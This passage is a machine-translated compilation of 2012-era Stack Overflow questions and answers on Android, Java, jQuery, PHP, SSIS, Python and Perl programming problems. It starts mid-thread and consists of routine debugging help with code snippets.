    getMenuInflater().inflate(R.menu.menu, menu);
    SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
    String preference = settings.getString("preference", string);
    if (preference.equals("us"))
        prefs = true;
    else if (preference.equals("metric"))
        prefs=false;
    return true; 

}

// called when an item is selected
@Override
public boolean onOptionsItemSelected(MenuItem item) {
    switch(item.getItemId()) { // decide which MenuItem was pressed based on it's id
    case R.id.menu_us:
            menuUS();
            break;
    case R.id.menu_metric:
            menuMetric();
            break;          
    }
    return true;
}

@Override
public boolean onPrepareOptionsMenu(Menu menu) {
    super.onPrepareOptionsMenu(menu);
    SharedPreferences settings = getSharedPreferences(PREFS_NAME,0);
    String preference = settings.getString("preference", string);
    if (preference.equals("us"))
        menu.findItem(R.id.menu_us).setChecked(true);
    else if (preference.equals("metric"))
        menu.findItem(R.id.menu_metric).setChecked(true);
    return true;
}

public void menuUS() {
    prefs = true;
    SharedPreferences settings = getSharedPreferences(PREFS_NAME,   Activity.MODE_PRIVATE);
    SharedPreferences.Editor editor = settings.edit();
    editor.putString("preference", "us");
    editor.commit();
    Log.v(LOG_TAG, "prefs value menuUS: " +prefs);
}

public void menuMetric() {
    prefs = false;
    SharedPreferences settings = getSharedPreferences(PREFS_NAME, Activity.MODE_PRIVATE);
    SharedPreferences.Editor editor = settings.edit();
    editor.putString("preference", "metric");
    editor.commit();
    Log.v(LOG_TAG, "prefs value menuMetric: " +prefs);
}

public void calculateCylinder(View v) {
    Intent calculateCylinderUS = new Intent(this, CalculateCylinder.class);
    Intent calculateCylinderMetric = new Intent(this, CalculateCylinderMetric.class);
     Log.v(LOG_TAG, "prefs value calculateCylinder: " +prefs);
    if (prefs == true)
        startActivity(calculateCylinderUS);
    else if (prefs == false)
        startActivity(calculateCylinderMetric);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:09:10.260

请注意，`onPrepareOptionsMenu`在菜单显示给用户之前被调用。查看您正在调用的代码`setChecked(true)`并`R.id.menu_us`基于`R.id.menu_metric`局部变量，无论何时创建活动，该变量`prefs`的值都将**始终**存在。`true`因此，为了保持这些状态，我们必须根据偏好值而不是基于局部变量的值来更新菜单项。

我认为你宁愿修改你的`onPrepareOptionsMenu`和`onCreateOptionsMenu`功能如下并试一试：

```
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.menu, menu);
    return true; 
}

@Override
public boolean onPrepareOptionsMenu(Menu menu) {
    super.onPrepareOptionsMenu(menu);
    SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
    String preference = settings.getString("preference", string);
    if (preference == "us")
        menu.findItem(R.id.menu_us).setChecked(true);
    else if (preference == "metric")
        menu.findItem(R.id.menu_metric).setChecked(true);
    return true;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T03:29:03.790

不要通过`==`符号比较字符串变量

这里

```
if (preference == "us")
        menu.findItem(R.id.menu_us).setChecked(true);
    else if (preference == "metric")
        menu.findItem(R.id.menu_metric).setChecked(true); 
```

改为使用`.equals()`

```
if (preference.equals("us"))
        menu.findItem(R.id.menu_us).setChecked(true);
    else if (preference.equals("metric"))
        menu.findItem(R.id.menu_metric).setChecked(true); 
```

# android - 安卓线程重置

> ID：13061105
> 
> 赞同：0
> 
> 时间：2012-10-25T03:27:29.717
> 
> 标签：android, multithreading, android-layout, reset

我的代码是：

```
public class EventDialog2 extends Dialog implements OnTouchListener{

    TextView textv;
    Context con;
    Thread t;
    int flag=0;
    public EventDialog2(Context context, int dialogslideanim) {
        super(context, dialogslideanim);
        con = context;

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.dialog2);
        getWindow().setGravity(Gravity.BOTTOM);
        timing();
        LinearLayout line = (LinearLayout) findViewById(R.id.linear2);
        line.setOnTouchListener(this);
        line.removeAllViews();
        for (int i = 0; i < 15; i++) {
            TextView tv = new TextView(con);
            tv.setText("TestProcess " + i);
            tv.setTextColor(Color.BLACK);
            line.addView(tv);

        }

    }

    private void timing() {
        // TODO Auto-generated method stub
        if(flag==1){
        t.stop();

            flag=0;
        }

        t = new Thread(new Runnable() {

            public void run() {
                try {

                    t.sleep(3000);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();

                }

                dismiss();

            }
        });
        t.start();
    }

    public boolean onTouch(View v, MotionEvent event) {
        System.out.println("touched");
        flag=1;
        timing();
        return false;
    }
} 
```

这里线程工作正常，因为它会在 3 秒后休眠。但是我需要当我们在对话框中触摸时线程应该被**重置**，并且应该在触摸后 3 秒后休眠。请帮我。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T12:12:25.870

在您调用dismiss()之前，您需要测试自上次触摸以来是否已经过3秒；这就是我将如何做到的。

```
public class EventDialog2 extends Dialog implements OnTouchListener{

    TextView textv;
    Context con;
    Thread t;
    int flag=0;
    Long lastTouchHappenedAt = System.currentTimeMillis();
    Handler handle = new Handler();

    public EventDialog2(Context context, int dialogslideanim) {
        super(context, dialogslideanim);
        con = context;

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.dialog2);
        getWindow().setGravity(Gravity.BOTTOM);
        handle.postDelayed(delayDismis, 3000);

        LinearLayout line = (LinearLayout) findViewById(R.id.linear2);
        line.setOnTouchListener(this);
        line.removeAllViews();
        for (int i = 0; i < 15; i++) {
            TextView tv = new TextView(con);
            tv.setText("TestProcess " + i);
            tv.setTextColor(Color.BLACK);
            line.addView(tv);

        }

    }

    private Runnable delayDismis = new Runnable() {
        public void run() {
                if(System.currentTimeMillis() - lastTouchHappenedAt >= 3000){
                    dismiss();
                    {
            }
        };

    public boolean onTouch(View v, MotionEvent event) {
        System.out.println("touched");
        flag=1;
        lastTouchHappenedAt = System.currentTimeMillis();
        handle.postDelayed(delayDismis, 3000);
        return false;
    }
} 
```

# javascript - 滑出和鼠标外部故障jquery

> ID：13061107
> 
> 赞同：1
> 
> 时间：2012-10-25T03:27:41.240
> 
> 标签：javascript, jquery, css

这是[小提琴](http://jsfiddle.net/mitchbregs/9spzQ/9/)。

问题是，当您单击按钮关闭滑出框时，会出现故障。我不知道如何解决它。

如果有人可以帮助我，那就太好了。谢谢！

```
var mouse_is_inside = false;

        $(document).ready(function(){

            $('#box').hover(function(){ 
                mouse_is_inside=true; 
            }, function(){ 
                mouse_is_inside=false; 
            });
            $("body").mouseup(function(){ 
                if(! mouse_is_inside) $('#box').slideUp();
            });
        }); 
```

这就是代码，如果它可以帮助任何人。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T03:31:30.750

改用[`slideToggle`](http://api.jquery.com/slideToggle/)：

```
$(".show").click(function(){
    $("#box").slideToggle();
}); 
```

小提琴：http: [//jsfiddle.net/9spzQ/10/](http://jsfiddle.net/9spzQ/10/)

# phpsh - 如何在phpsh中进行多行输入？

> ID：13061108
> 
> 赞同：4
> 
> 时间：2012-10-25T03:27:43.673
> 
> 标签：phpsh

我可以这样：

```
php>multline start; 
.... $a =<<< EOF 
.... hello hi how are you this is phpSH 
.... hello there its test line 
.... EOF; 
.... multiline end; 
```

在 phpsh 中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-20T02:40:57.863

举个例子，if 多行语句：

1.  类型：如果（条件）{
2.  只需按 Enter
3.  ...并写下你想要的。
4.  } 关闭多行语句。并按 Enter 执行它。

您可以通过按 ctrl + c 进一步取消写入。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-05T11:51:14.733

也许就像这样：

```
php> $test = "
 ... hello hi how are you this is phpSH
 ... hello there its test line
 ... "
    <the_empty_result>
php>
php> echo $test

hello hi how are you this is phpSH
hello there its test line

php>
php> =$test
"\nhello hi how are you this is phpSH\nhello there its test line\n" 
```

或者

```
php> $test = "hello hi how are you this is phpSH
 ... hello there its test line"
    <the_empty_result>
php>
php> echo $test
hello hi how are you this is phpSH
hello there its test line
php>
php> =$test
"hello hi how are you this is phpSH\nhello there its test line" 
```

当然，按`Enter`创建上面的多行输入。

# php - 添加php文件后div的位置发生变化

> ID：13061109
> 
> 赞同：0
> 
> 时间：2012-10-25T03:27:56.627
> 
> 标签：php, web

我有一个这样的 php 代码，它主要从站点获取 rss 提要

```
<?php
     $xmlstr = file_get_contents("http://news.myweb.com.au/index.php?format=feed&amp;type=rss");    
     $xml_object = new SimpleXMLElement($xmlstr);    
     $items = $xml_object->channel->item;
?>    
<?php foreach($items as $item):?>    
    <h1> <?php echo $item->title;?> </h1>       
    <p >
        <?php echo substr($item->description, 0, 250);?>...
        <a href="<?php echo $item->link;?>">Read More</a>
    </p>    
<?php endforeach; ?>
now I am including that file in some other file like this

<div class="leftColumnH">               
    <?php include('blog.php');?>
</div>

<div class="rightColumnH">                              
<h2  class="fontstyle leftColumnText ">Web Development & Graphic Design</h2>
some test here                      
</div> 
```

但是，当我在浏览器中看到它时，“rightcolumn”进入了一个 div，其中的类“feed-description”在 leftColunm 中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T03:52:44.253

我假设您对 leftColumnH 和 rightColumnH 使用浮点数。

当您对子 div 使用 float 时，父 div 的高度不会设置为子 div 的高度，除非您的父 div 也具有 float 属性。

例如：

创建这些类

```
.parent{ border:1px solid red;}
.childLeft{border:1px solid blue;float:left;width:49%; height:100px;} 
.childRight{border:1px solid blue;float:right;width:49%; height:100px;} 
```

现在在你的 html 文件中

```
<div class="parent">
  <div class="childLeft"></div>
  <div class="childRight"></div>
</div> 
```

如果您运行此文件，您将能够看到您的子 div 不会正确包含在您的父 div 中。

为此，只需尝试将 float 属性也应用于您的父 div。参考下面的CSS

```
.parent{ border:1px solid red;float:left;width:100%} 
```

现在，如果您运行此文件，那么您可以看到您的子 div 将包含在您的父 div 中。

我建议您在代码中检查这一点并进行必要的样式更改。这与 PHP 无关。您最好将您的 CSS 代码与您的父 div 及其 CSS 代码一起发布。因为我回答你，假设你使用 float 作为子 div。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T12:53:05.513

您必须确保您`<?php echo substr($item->description, 0, 250);?>`没有回显任何 div 标签。如果`$item->description`有`<div>`标签，那么您的截断可能正在删除`</div>`标签。如果其回显 div 标签，则关闭标签。

希望这可以帮助。

# java - 在java代码中进行堆排序？

> ID：13061113
> 
> 赞同：2
> 
> 时间：2012-10-25T03:28:21.920
> 
> 标签：java, heapsort

我正在尝试在 java 中进行一些堆排序以获取乐趣。

首先，我创建了一个最大堆。然后取第一个元素到变量max，将最后一个元素从未排列的数组中移到堆顶，然后下推。

我尝试了 21 个元素，70% 的时间都可以正常工作，我想知道是否有人发现了问题。

谢谢。

```
public class HeapSort extends Sort{
    public int sort(int arr[]) {
        for (int i = 1; i < arr.length; i++) {
            // add to heap
            int p = i;
            int pp = p /2 ;
            while (p > 0 && arr[pp] < arr[p]) {
                swap(arr, p, pp);
                p = pp;
                pp = p / 2;
            }

        }   

        for (int i = arr.length - 1; i > 0; i--) {
            swap(arr, 0, i);
            int p = 0;
            int child1 = (p << 1) + 1;
            int child2 = (p << 1) + 2;

            while (child2 < i || child1 < i) {
                if (child1 >= i) {
                    if (arr[p] < arr[child2]) {
                        swap(arr, p, child2);
                        p = child2;
                    } else { 
                        break;
                    }
                } else if (child2 >= i) {
                    if (arr[p] < arr[child1]) {
                        swap(arr, p, child1);
                        p = child1;
                    } else {
                        break;
                    }
                } else {
                    int minIdx = arr[child1] < arr[child2] ? child1 : child2;
                    int maxIdx = child1 == minIdx ? child2 : child1;

                    if (arr[p] < arr[maxIdx]) {
                        swap(arr, p, maxIdx);
                        p = maxIdx;
                    } else {

                        break;

                    }
                }
                child1 = (p << 1) + 1;
                child2 = (p << 1) + 2;
            }

        }
        return 0;

    }
    void swap(int arr[], int idx1, int idx2) {
        int tmp = arr[idx1]; arr[idx1] = arr[idx2]; arr[idx2] = tmp;
    }
    public String toString() {
        return "HeapSort";
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T03:52:27.027

在堆排序的第一步中，您没有正确构建堆。在基于零的数组上除以二之前，您需要减去一。

```
public class HeapSort extends Sort{ 
   public int sort(int arr[]) { 
      for (int i = 1; i < arr.length; i++) { // add to heap 
         int p = i;
         // int pp = p /2 ;  <======= Problem!
         int pp = (p-1) / 2; 
         while (p > 0 && arr[pp] < arr[p]) { 
            swap(arr, p, pp); p = pp; 
            //  pp = p / 2; // <=====Problem!
            pp = (p-1) /2;

} 
```

# user-controls - 如何创建容器控件

> ID：13061115
> 
> 赞同：1
> 
> 时间：2012-10-25T03:28:40.870
> 
> 标签：user-controls, containers

我是这里的新手，如果这是一个常见问题，请原谅我的无知。

对于 Windows Phone 7 / Silverlight 应用程序，我想创建一个自定义容器控件，它将承载其他控件——很像 ListBox 或 StackPanel。

请指出我正确的方向。任何代码示例将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:40:56.303

为此，您可以使用`StackPanel`and `Grid`。这是一个有趣的链接，它提供了 Windows Phone 7 应用程序开发的[布局提示和技巧](http://www.microsoft.com/design/toolbox/tutorials/windows-phone-7/layout-tips/)。

# c# - 如何为包含带有可选参数的函数的表达式构建和评估后缀堆栈

> ID：13061120
> 
> 赞同：0
> 
> 时间：2012-10-25T03:29:07.080
> 
> 标签：c#, stack, expression, postfix-notation

例如：

```
3 + 4 * max(2, avg(6, 8, 2, 4,...), 6, ...) 
```

我的第一个想法是创建一个特殊的标记，它是参数的计数，并在遇到“）”时将其推入堆栈。但是我不确定当参数本身可能是带参数的函数时如何保持计数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T15:56:10.890

我通过稍微修改 Shutting-yard 算法并在任何前缀操作之后立即将特殊标记（称为 @）插入到输出堆栈中解决了这个问题。

例如：4 * max(2, avg(6, 8), 32) + 3 将生成一个输出堆栈： + 3 * Max 32 Avg 8 6 @ 2 @ 4

当从左到右评估这个堆栈时，函数 Avg 将知道当它似乎是第一个 @ 标记时停止弹出操作数，函数 max 也将知道。

# java - 从鼠标光标下获取 RGB 值

> ID：13061122
> 
> 赞同：3
> 
> 时间：2012-10-25T03:29:10.903
> 
> 标签：java, swing, awt, cursor-position, mixing

我正在尝试构建一个程序来检测鼠标光标下的颜色，然后在屏幕上的窗口中显示颜色和 RGB 值。我对 Java 很陌生，所以什么都不懂。在朋友的帮助下，我编写了两个代码，第一个获取缓冲图像的特定坐标的 RGB 值，另一个获取用户定义的 RGB 值并显示一个带有颜色的窗格。我的问题是“我如何让程序检测鼠标光标下的颜色，无论它滚动的是什么？

```
public class Buffered_Image 
{
public static void main(String[] args) throws IOException 
{
    BufferedImage bi = ImageIO.read(new File("C:/Users/user/Pictures/Hornet.jpg"));
    Color c = new Color(bi.getRGB(50,40));
    int red=c.getRed();
    int green=c.getGreen();
    int blue=c.getBlue();

    System.out.print("Red " + red + " Green " + green+ " Blue" + blue + "\n" );
}
}

public class RGB_Pane 
{

public static void main(String[] args) 
{
    JFrame F = new JFrame("RGB");
    Panel Pan = new Panel();
    F.getContentPane().add(Pan);
    F.pack();
    F.setVisible(true);
    F.setSize(300, 300);
}
}

class Panel extends JPanel
{
public Panel()
{ 
    setPreferredSize(new Dimension(200,200));
    int Red = Integer.parseInt(JOptionPane.showInputDialog("Enter value for RED"));
    int Green = Integer.parseInt(JOptionPane.showInputDialog("Enter value for Green"));
    int Blue = Integer.parseInt(JOptionPane.showInputDialog("Enter value for BLUE"));
    Color Defined_Color = new Color(Red,Green,Blue);
    setBackground(Defined_Color);
}
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-25T03:54:14.000

正如@Hovercraft 指出的那样。

从查看开始[`Robot#getPixelColor`](http://docs.oracle.com/javase/7/docs/api/java/awt/Robot.html#getPixelColor%28int,%20int%29)。

You will need to know where the mouse cursor is, while there's no "easy" way to track the cursor, you can get it's current location using [`MouseInfo#getPointerInfo`](http://docs.oracle.com/javase/7/docs/api/java/awt/MouseInfo.html#getPointerInfo%28%29)

**UPDATED with example**

This is little example of the concept. This works based on the moition of the mouse cursor. A possible enhancement would be to also notify the monitor listener when the color changes under the cursor as well...

```
public class WhatsMyColor {

    public static void main(String[] args) throws IOException {
        new WhatsMyColor();
    }

    public WhatsMyColor() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                try {
                    JFrame frame = new JFrame();
                    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                    frame.setLayout(new BorderLayout());
                    frame.add(new MouseColorPane());
                    frame.setSize(400, 200);
                    frame.setLocationRelativeTo(null);
                    frame.setVisible(true);
                } catch (Exception exp) {
                    exp.printStackTrace();
                }

            }
        });
    }

    public class MouseColorPane extends JPanel implements MouseMonitorListener {

        private Robot robot;

        private JLabel label;

        public MouseColorPane() throws AWTException {

            label = new JLabel();

            setLayout(new GridBagLayout());
            add(label);

            robot = new Robot();
            PointerInfo pi = MouseInfo.getPointerInfo();
            updateColor(pi.getLocation());
            MouseMonitor monitor = new MouseMonitor();
            monitor.setMouseMonitorListener(this);
            monitor.start();

        }

        protected void updateColor(Point p) {

            Color pixelColor = robot.getPixelColor(p.x, p.y);
            setBackground(pixelColor);

            label.setText(p.x + "x" + p.y + " = " + pixelColor);

        }

        @Override
        public void mousePositionChanged(final Point p) {
            SwingUtilities.invokeLater(new Runnable() {

                @Override
                public void run() {
                    updateColor(p);
                }

            });
        }
    }

    public interface MouseMonitorListener {

        public void mousePositionChanged(Point p);
    }

    public static class MouseMonitor extends Thread {

        private Point lastPoint;
        private MouseMonitorListener listener;

        public MouseMonitor() {
            setDaemon(true);
            setPriority(MIN_PRIORITY);
        }

        public void setMouseMonitorListener(MouseMonitorListener listener) {
            this.listener = listener;
        }

        public MouseMonitorListener getMouseMonitorListener() {
            return listener;
        }

        protected Point getMouseCursorPoint() {
            PointerInfo pi = MouseInfo.getPointerInfo();
            return pi.getLocation();
        }

        @Override
        public void run() {
            lastPoint = getMouseCursorPoint();
            while (true) {
                try {
                    sleep(250);
                } catch (InterruptedException ex) {
                }

                Point currentPoint = getMouseCursorPoint();
                if (!currentPoint.equals(lastPoint)) {
                    lastPoint = currentPoint;
                    MouseMonitorListener listener = getMouseMonitorListener();
                    if (listener != null) {
                        listener.mousePositionChanged((Point) lastPoint.clone());
                    }
                }

            }
        }
    }
} 
```

# c# - 如何在 Visual Studio 2012 中获取 asmx Web 服务文件？

> ID：13061124
> 
> 赞同：0
> 
> 时间：2012-10-25T03:29:25.850
> 
> 标签：c#, web-services, asmx

我需要将 asmx Web 服务部署到服务器。我可以在本地运行该服务，它运行良好，但 asmx 文件保存在哪里？在我的项目文件夹中，我只能看到解决方案文件。这是我第一次处理 Web 服务，如果这是一个愚蠢的问题，请原谅我。如果有什么不同，该服务是用 C# 编写的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:35:55.920

在您的项目中，选择`Build Menu -> Publish`. 发布方式有很多种，但为了简单的方式，你可以选择`File System`. 定义您`Target Location`并单击`Publish`。完成后，转到`Target Location`使用 Windows 资源管理器，您将获得所有需要移动到 IIS 服务器虚拟目录的文件。

# sql - SQL SSIS 使用派生列转换来处理空数据.. 替代方案？

> ID：13061130
> 
> 赞同：2
> 
> 时间：2012-10-25T03:30:16.147
> 
> 标签：sql, sql-server-2008, tsql, ssis, data-warehouse

我有一个包含 200 多列的源表，我将其放入 SSIS 并使用“OLEDB 源”组件来提供数据，然后将流映射到派生列转换以通过替换来处理空数字/日期/文本数据它带有空白值。

目前，我在派生列中设置以下表达式：

```
ISNULL([EMPLOYEE ID]) ? "" : [EMPLOYEE ID]

ISNULL([EMPLOYEE FNAME]) ? "" : [EMPLOYEE FNAME] 
```

ETC...

由于我有 200 多列，因此我必须在派生转换中执行 200 次，是否有更好的方法使用 SSIS 来处理这个问题？

在 Windows 2008R2 上运行 SQL Server 2008 Standard。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T06:06:57.400

在 SSIS 中，您可以使用派生列/脚本转换[as transformation] 并编写代码以将 NULL 转换为空白。SSIS 中没有其他选择。SSIS 将创建缓冲区来处理计算。它会减慢你的 SSIS 包。我的建议是尝试在 SQL 查询中使用 ISNULL 函数或 COALESCE 函数，并将 NULL 转换为空白，以便所有转换都发生在 Serverside 本身。

```
Select ISNULL(EmployeeId,'') 
```

或者

```
Select COALESCE(EmployeeId,'') 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-28T01:04:30.530

我最终坚持使用 SSIS 的派生列转换并插入每一列并检查 ISNULL([EMPLOYEE FNAME]) ？"" : [EMPLOYEE FNAME] 因为这是我最熟悉的方法。

# wcf - Ninject WCF 扩展添加错误处理程序

> ID：13061133
> 
> 赞同：1
> 
> 时间：2012-10-25T03:30:30.803
> 
> 标签：wcf, ninject, ierrorhandler

我正在尝试在我的 Web 服务上将 Ninject.Extensions.Wcf 用于 DI，但还想注入一个自定义 IErrorHandler。

据我所知，这应该在自定义 IServiceBehavior 的 ApplyDispatchBehavior 方法中完成，但我看不到任何方法可以覆盖 Ninject 的服务行为。

# css - 如何使用 CSS 制作下拉菜单

> ID：13061138
> 
> 赞同：0
> 
> 时间：2012-10-25T03:30:50.373
> 
> 标签：css

我正在尝试仅使用 CSS 在我的导航 div 中创建一个下拉菜单。我有我想要的风格和一切，但似乎唯一搞砸的就是身高。将鼠标悬停在链接上时，我想显示三个列表项，但只显示一个。我知道它与导航 div 的高度有关，但我不知道如何解决它，因为我不希望紫色条看起来比它高。我只是希望链接像往常一样下拉到下面的文本顶部。请帮忙？

[http://www.pitt.edu/~mkm49/1052/available.html](http://www.pitt.edu/~mkm49/1052/available.html)

（是的，这是为了学校作业，但我自己已经完成了所有工作，我只需要帮助克服这一障碍，对于那些对帮助学生感到奇怪的人来说！）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:36:47.680

您是否使用 firebug 或 chrome 开发工具来检查您的工作？你有一些重叠的问题，你应该能够通过一点检查来弄清楚。

还有一个快速提示，因为这是一个项目......你已经在你的 css 中使用了大量的绝对定位。这通常不是一个好的做法，并且以间接的方式，可能是您的问题的原因。祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:42:11.257

您的代码似乎全错了，我通读了您的源代码，显然您将所有菜单项隐藏在屏幕之外很远的地方，`left: -999em`这是一种非常糟糕的方法。

您应该尝试查看 CSS`display`规则，您可以使用`display: none`隐藏 div，然后`display: block`或`display: inline`再次显示它，这取决于您希望该项目是内联的还是阻止的。

尝试重写代码如何处理菜单项，例如`display`悬停时的简单更改就足够了。

**笔记**

你应该尽量让你的 ID 和 Classes 更容易理解，目前它们看起来有点杂乱无章和信息不足。

我希望你能得到这个工作！

# python - 使用 exec 动态调用 python 模块

> ID：13061140
> 
> 赞同：0
> 
> 时间：2012-10-25T03:31:04.017
> 
> 标签：python

我有 2 个模块

mexec1.py

```
def exec1func():
    print 'exec1'
    exec 'c:/python27/exec2.py'

if __name__ == '__main__':
    exec1func() 
```

执行2.py

```
def exec2func(parm=''):
    print 'exec2 parm',parm

if __name__ == '__main__':
    exec2func(parm='') 
```

从 exec1.py 我想只使用 exec 或 execfile 调用 exec2.py 的 exec2func ...我不想要 subprocess.Popen ..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T03:33:59.827

改用`import`：

```
def exec1func():
    from exec2 import exec2func
    exec2func() 
```

如果要使用完整路径导入，请使用`imp.load_source`：

```
import imp

def exec1func():
    exec2 = imp.load_source('exec2', 'c:/python27/exec2.py')
    exec2.exec2func() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:37:00.750

最好把它做成一个模块并导入它。如果您需要动态导入，请使用 importlib。

```
mod = importlib.import_module("exec2", package=None)
mod.exec2func() 
```

# android - url 中的 java.lang.illegalargumentexception 非法字符

> ID：13061144
> 
> 赞同：4
> 
> 时间：2012-10-25T03:31:15.157
> 
> 标签：android

我想像这样向网络服务请求
我的参数

```
urlString = http://ip/autodownload/andro.php?key=apps.apk|2|bla.bla.bla

public void getRequest(String Url) {
    Toast.makeText(this, "Tambah Data " + Url + " ", Toast.LENGTH_SHORT).show();
    HttpClient client = new DefaultHttpClient();
    HttpGet request = new HttpGet(urlString);
    try {
        System.out.println("tes");
        HttpResponse response = client.execute(request);
        Toast.makeText(this,request(response),Toast.LENGTH_SHORT).show();
        String res = EntityUtils.toString(response.getEntity());
        System.out.println(res);
        Update(res);
    } catch (Exception ex) {
        Toast.makeText(this, "Gagal Konek Server !", Toast.LENGTH_SHORT).show();
    }       
} 
```

如果我在浏览器中运行就可以了，但是当我在android中运行时会出现这样的错误

```
10-25 10:24:49.862: ERROR/AndroidRuntime(14602): FATAL EXCEPTION: main
10-25 10:24:49.862: ERROR/AndroidRuntime(14602): java.lang.IllegalArgumentException: Illegal character in query at index 67: http://10.234.152.120/autodownload/andro.php?key=DeliverReceipt.apk|2|com.sat.deliver
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at java.net.URI.create(URI.java:970)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at org.apache.http.client.methods.HttpGet.<init>(HttpGet.java:75)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at com.sat.deliver.MenuUtama.getRequest(MenuUtama.java:140)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at com.sat.deliver.MenuUtama.requestParam(MenuUtama.java:118)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at com.sat.deliver.MenuUtama.onClick(MenuUtama.java:355)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at android.view.View.performClick(View.java:2408)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at android.view.View$PerformClick.run(View.java:8816)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at android.os.Handler.handleCallback(Handler.java:587)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at android.os.Handler.dispatchMessage(Handler.java:92)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at android.os.Looper.loop(Looper.java:123)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at android.app.ActivityThread.main(ActivityThread.java:4627)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at java.lang.reflect.Method.invokeNative(Native Method)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at java.lang.reflect.Method.invoke(Method.java:521)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
10-25 10:24:49.862: ERROR/AndroidRuntime(14602):     at dalvik.system.NativeStart.main(Native Method) 
```

我尝试使用 Urlencoding 和替换字符，但它不起作用
我该怎么办？谢谢
*****
已解决 我在 urlString 中替换字符，如：

```
urlString+="?key="+appName.trim().replace(".", "%2E")+"|2|".trim().replace("|", "%7C")+packageName.trim().replace(".", "%2E"); 
```

它工作正常:)

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-05-01T07:21:55.863

尝试编码您的网址

```
String link="http://example.php?string1="+URLEncoder.encode(string1)+"&string2="+URLEncoder
.encode(string2)+"&string3="+URLEncoder.encode(string3)+"&string4="+URLEncoder.encode(string4)+""; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-20T03:05:51.410

就我而言，是我附加的变量导致了问题。它有一个额外的空间（空格）。我修剪了它，错误消失了。" [http://somewebsite.com/somefile?q=](http://somewebsite.com/somefile?q=) "+someVariable.trim()

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-15T04:18:25.003

这对我有用。假设您的 IP 地址中有非法字符。然后将其转换为 Base64 代码并发送到您的服务器。

例如：

```
String ip_address = StaticClass.getIPAdress();
        try {

            // Sending side
            byte[] data = ip_address.getBytes("UTF-8");
            ip_address = Base64.encodeToString(data, Base64.DEFAULT);

        } catch (Exception e) {
            e.printStackTrace();
            ip_address = "";
        }

Write encode ip_address or any field you want inside your url. Decode the variables at your server. But i'm not sure if you are using : com.loopj.android.http.AsyncHttpClient.get 
```

vkj

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T03:42:13.067

检查这个

```
String myurltoencode = "http://ip/autodownload/andro.php?key=apps.apk|2|bla.bla.bla";
URLEncoder.encode(myurltoencode,"UTF-8"); 
```

# perl - Perl，使输出去它应该去的地方

> ID：13061150
> 
> 赞同：1
> 
> 时间：2012-10-25T03:31:59.197
> 
> 标签：perl, foreach

这是一个简单的脚本，它在 spool/ 中查找文件，然后使用姊妹脚本处理它们。然后我希望它把结果输出到 results/.

这是问题所在，我编写的代码将结果放入结果/假脱机/中，这是不对的。我怎样才能让他们进入结果/只？

我一直试图用来使输出文件包含它已处理的文件名的 $date_file 。所以我猜应该有一些东西可以从中删除 /spool ，但我无法对其进行排序。

```
#!/usr/bin/perl -w

use POSIX;
my $date = strftime "%Y%m%d_%H%M.txt", localtime;

my @files = <spool/*.*>;
foreach $file (@files) {
    my $date_file = $file;
    system("$^X  wfreq.pl $file >> results/${date_file}_$date");
    unlink("$file");
} 
```

请记住，我在这方面真的很新……所以要温柔:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T15:22:59.430

您还可以考虑使用 File::Basename 的 basename()。

```
my $date_file = basename($file); 
```

